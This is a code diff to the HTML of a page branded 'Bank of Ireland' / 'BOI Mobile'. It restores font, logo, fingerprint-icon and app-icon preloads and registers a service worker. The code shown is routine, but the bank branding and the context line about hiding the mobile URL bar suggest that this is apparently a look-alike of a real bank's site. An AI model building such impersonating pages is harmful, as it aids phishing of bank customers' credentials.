@@ -17,14 +17,46 @@
     <meta name="application-name" content="BOI Mobile" />
     <meta name="theme-color" content="#0000ff" />
     
-    <!-- Font preloading removed - using system fonts -->
+    <!-- Critical font preloading for instant rendering -->
+    <link rel="preload" href="/OpenSans-Regular-webfont.woff2" as="font" type="font/woff2" crossorigin>
+    <link rel="preload" href="/OpenSans-Bold-webfont.woff2" as="font" type="font/woff2" crossorigin>
+    <link rel="preload" href="/OpenSans-Semibold-webfont.woff2" as="font" type="font/woff2" crossorigin>
     
-    <!-- Asset preloading removed to fix 404 errors -->
+    <!-- Critical asset preloading -->
+    <link rel="preload" href="/boi_logo.svg" as="image">
+    <link rel="preload" href="/IMG_0633_1749764752035.jpeg" as="image">
+    <link rel="preload" href="/icon_HID.svg" as="image">
+    <link rel="preload" href="/Icons_Fingerprint.svg" as="image">
+    
+    <!-- Navigation icons preloading -->
+    <link rel="preload" href="/icon-footer-accounts.svg" as="image">
+    <link rel="preload" href="/icon-footer-accounts-highlight.svg" as="image">
+    <link rel="preload" href="/icon-footer-payments.svg" as="image">
+    <link rel="preload" href="/icon-footer-payments-highlight.svg" as="image">
+    <link rel="preload" href="/icon-footer-services.svg" as="image">
+    <link rel="preload" href="/icon-footer-services-highlight.svg" as="image">
+    <link rel="preload" href="/icon-footer-apply.svg" as="image">
+    <link rel="preload" href="/icon-footer-apply-highlight.svg" as="image">
+    <link rel="preload" href="/icon-footer-more.svg" as="image">
+    <link rel="preload" href="/icon-footer-more-highlight.svg" as="image">
     
     <!-- PWA Manifest -->
     <link rel="manifest" href="/manifest.json" />
     
-    <!-- App icons removed to fix 404 errors -->
+    <!-- App Icons for different devices -->
+    <link rel="apple-touch-icon" sizes="57x57" href="/boi_app_icon.png" />
+    <link rel="apple-touch-icon" sizes="60x60" href="/boi_app_icon.png" />
+    <link rel="apple-touch-icon" sizes="72x72" href="/boi_app_icon.png" />
+    <link rel="apple-touch-icon" sizes="76x76" href="/boi_app_icon.png" />
+    <link rel="apple-touch-icon" sizes="114x114" href="/boi_app_icon.png" />
+    <link rel="apple-touch-icon" sizes="120x120" href="/boi_app_icon.png" />
+    <link rel="apple-touch-icon" sizes="144x144" href="/boi_app_icon.png" />
+    <link rel="apple-touch-icon" sizes="152x152" href="/boi_app_icon.png" />
+    <link rel="apple-touch-icon" sizes="180x180" href="/boi_app_icon.png" />
+    <link rel="icon" type="image/png" sizes="192x192" href="/boi_app_icon.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/boi_app_icon.png" />
+    <link rel="icon" type="image/png" sizes="96x96" href="/boi_app_icon.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="/boi_app_icon.png" />
     
     <title>Bank of Ireland</title>
   </head>
@@ -126,7 +158,18 @@
         }, 500);
       }, 1000);
 
-      // Service worker removed to fix loading issues
+      // Register service worker for enhanced security
+      if ('serviceWorker' in navigator) {
+        window.addEventListener('load', function() {
+          navigator.serviceWorker.register('/sw.js')
+            .then(function(registration) {
+              console.log('SW registered with scope: ', registration.scope);
+            })
+            .catch(function(err) {
+              console.log('SW registration failed: ', err);
+            });
+        });
+      }
 
       // Additional mobile-specific URL hiding
       window.addEventListener('load', function() {
